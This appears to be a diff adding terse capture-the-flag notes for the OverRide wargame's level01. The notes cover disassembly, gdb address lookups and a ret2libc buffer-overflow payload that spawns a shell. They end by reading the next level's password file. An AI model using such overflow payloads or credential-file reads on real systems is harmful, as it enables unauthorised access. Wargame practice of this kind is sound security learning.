@@ -1,0 +1,50 @@
+scp -P 2223 level01@localhost:level01 /home/ncardozo/Documents/OverRide
+
+strings level01
+
+verifying username....
+dat_wil
+admin
+
+objdump -d level01 | grep -A50 '<main:>'
+
+objdump -d level01 | less
+
+ 8048565:       c7 44 24 04 64 00 00    movl   $0x64,0x4(%esp)
+
+ 804856d:       8d 44 24 1c             lea    0x1c(%esp),%eax
+
+ 8048574:       e8 f7 fd ff ff          call   8048370 <fgets@plt>
+
+
+python -c 'print "dat_wil\n" + "A"*80 + "BBBB"' > /tmp/test
+
+gdb ./level01
+
+run < /tmp/test
+
+info registers eip
+
+(si 42, tout va bien)
+
+break main
+
+run
+
+print system    (0xf7e6aed0)
+
+print exit      (0xf7e5eb70)
+
+find &system, +9999999, "/bin/sh"
+
+x/s <addresse /bin/sh>      (to confirm /bin/sh address)
+
+quit
+
+(python -c 'print "dat_wil\n" + "A"*80 + "SYSTEM" + "EXIT" + "\xec\x97\xf8\xf7"'; cat) | ./level01
+
+cat /proc/sys/kernel/randomize_va_space     (should show 0)
+
+cat /home/users/level02/.pass
+
+su level02
